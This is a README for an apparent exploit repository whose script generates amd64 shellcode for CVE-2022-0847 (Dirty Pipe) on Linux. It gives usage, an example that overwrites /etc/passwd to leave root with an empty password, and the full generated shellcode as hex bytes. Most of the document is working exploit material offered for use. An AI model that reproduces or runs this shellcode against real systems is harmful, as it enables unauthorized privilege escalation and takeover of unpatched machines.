# cve_2022_0847_shellcode

## Description

This repository contains a Python script (```gen_shellcode.py```), based on pwntools, to generate a shellcode implementing [CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847). <br>
The shellcode is based on this Poc: [antx](https://github.com/antx-code/CVE-2022-0847). <br>
I analyzed the code of the PoC and its execution with strace to catch all the system calls required to make the exploit, and at first I wrote a C program that uses ```syscall.h```; it was still not suitable for a shellcode, but it's good for reference, so I shipped it here (```tiny_cve-2022-0847.c```). <br>
The function which generates the shellcode takes 3 parameters: path of the file to write to, data to write and offset at which data must be written. <br>
An example of generated shellcode, in disassemble format from objdump, can be found in ```shellcode.asm```; it was generated with the following parameters:

- filename ```/etc/passwd```
- data ```:$1$$qRPK7m23GJusamGpoGLby/:0:0::/:/bin/sh\n```
- offset ```4```

It leaves the root with an empty password.

## Usage

```
$ python gen_shellcode.py 
Usage: gen_shellcode.py filename data offset [verbose (any value here sets verbose to True)]
```

You can import the function ```cve_2022_0847```, which generates the shellcode, to call it in other scripts, or directly use this script; there is an ```example_usage``` function which calls ```cve_2022_0847``` and makes an ELF with the shellcode. <br>
The ```cve_2022_0847``` also performs some basic sanity checks, and it prints what can go wrong with the exploit and the disassembled shellcode if ```verbose``` parameter is set. <br>
It returns the assembled shellcode. The ```main``` function calls ```cve_2022_0847``` with the command line parameters and prints the resulting shellcode in C-style hex, i.e. without decoding printable bytes. For example:

```
$ python gen_shellcode.py /etc/passwd ":$1$$qRPK7m23GJusamGpoGLby/:0:0::/:/bin/sh\n" 4
Resulting shellcode:
\x68\x72\x76\x65\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2f\x65\x74\x63\x2f\x70\x61\x73\x50\x48\x89\xe6\x6a\x9c\x5f\x31\xd2\x31\xc0\x66\xb8\x01\x01\x0f\x05\x48\x83\xec\x10\x48\x89\xe7\x6a\x16\x58\x0f\x05\x6a\x05\x5f\x31\xf6\x66\xbe\x08\x04\x6a\x48\x58\x0f\x05\x49\x89\xc7\x4d\x89\xfe\x6a\x05\x5f\x48\x81\xec\x00\x10\x00\x00\x48\x89\xe6\x31\xd2\xb6\x10\x4d\x85\xff\x74\x0a\x6a\x01\x58\x0f\x05\x49\x29\xd7\xeb\xf1\x4d\x89\xf7\x6a\x04\x5f\x4d\x85\xff\x74\x09\x31\xc0\x0f\x05\x49\x29\xd7\xeb\xf2\x6a\x03\x45\x31\xd2\x6a\x01\x41\x58\x45\x31\xc9\x6a\x03\x5f\x6a\x05\x5a\x48\x89\xe6\x31\xc0\x66\xb8\x13\x01\x0f\x05\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x72\x69\x5d\x6f\x01\x01\x01\x48\x31\x04\x24\x48\xb8\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x50\x48\xb8\x4c\x62\x79\x2f\x3a\x30\x3a\x30\x50\x48\xb8\x75\x73\x61\x6d\x47\x70\x6f\x47\x50\x48\xb8\x50\x4b\x37\x6d\x32\x33\x47\x4a\x50\x48\xb8\x3a\x31\x36\x39\x32\x33\x71\x52\x50\x48\x89\xe6\x6a\x05\x5f\x6a\x2d\x5a\x6a\x01\x58\x0f\x05\x31\xff\x31\xc0\xb0\xe7\x0f\x05
```

## Disclaimer

Supported architecture is only ```amd64```.

